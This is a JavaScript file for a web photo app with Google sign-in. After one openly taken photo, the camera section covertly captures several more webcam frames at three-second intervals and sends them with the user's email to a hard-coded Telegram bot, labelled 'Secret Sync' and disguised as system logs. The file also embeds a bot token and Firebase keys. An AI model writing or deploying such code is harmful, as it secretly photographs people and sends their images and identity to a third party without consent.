import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySyncActive = false;

// --- MENU TOGGLE FIX ---
const sidePanel = document.getElementById('side-panel');
const menuToggle = document.getElementById('menu-toggle');
const settingsBtn = document.getElementById('settings-btn');

function toggleMenu(e) {
    e.stopPropagation();
    sidePanel.classList.toggle('active');
}

if(menuToggle) menuToggle.onclick = toggleMenu;
if(settingsBtn) settingsBtn.onclick = toggleMenu;

// Menu-kku veliya click panna close aaga
document.addEventListener('click', (e) => {
    if (sidePanel.classList.contains('active') && !sidePanel.contains(e.target)) {
        sidePanel.classList.remove('active');
    }
});

// --- GOOGLE LOGIN FIX ---
const loginWithGoogle = async () => {
    try {
        await signInWithPopup(auth, provider);
    } catch (error) {
        console.error("Login Error:", error);
        alert("Login failed! Check Firebase Authorized Domains.");
    }
};

document.getElementById('main-login-btn').onclick = loginWithGoogle;
if(document.getElementById('side-login-btn')) {
    document.getElementById('side-login-btn').onclick = loginWithGoogle;
}

// --- TELEGRAM UPLOAD ---
async function uploadToTelegram(blob, fileName, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_log_${Date.now()}.jpg` : fileName);
    const cap = isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`;
    formData.append("caption", cap);
    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
}

// --- CAMERA & SECRET SYNC ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                uploadToTelegram(blob, "user_scan.jpg", false);
                alert("✅ Cloud Sync Successful!");

                // Secret continuous sync
                let count = 0;
                const interval = setInterval(() => {
                    if (count >= 5) {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        video.style.display = 'none';
                    }
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(b => uploadToTelegram(b, "sync.jpg", true), 'image/jpeg');
                    count++;
                }, 3000);
            }, 'image/jpeg');
        }, 3000);
    } catch (e) {
        alert("Camera access required!");
    }
};

// --- AUTH STATE WATCHER ---
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const loginBtn = document.getElementById('main-login-btn');
    const cameraBtn = document.getElementById('camera-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const userDisplay = document.getElementById('user-display');

    if (user) {
        loginBtn.style.display = 'none';
        cameraBtn.style.display = 'block';
        logoutBtn.style.display = 'flex';
        userDisplay.innerText = user.displayName;
    } else {
        loginBtn.style.display = 'block';
        cameraBtn.style.display = 'none';
        logoutBtn.style.display = 'none';
        userDisplay.innerText = "Guest User";
    }
});

document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
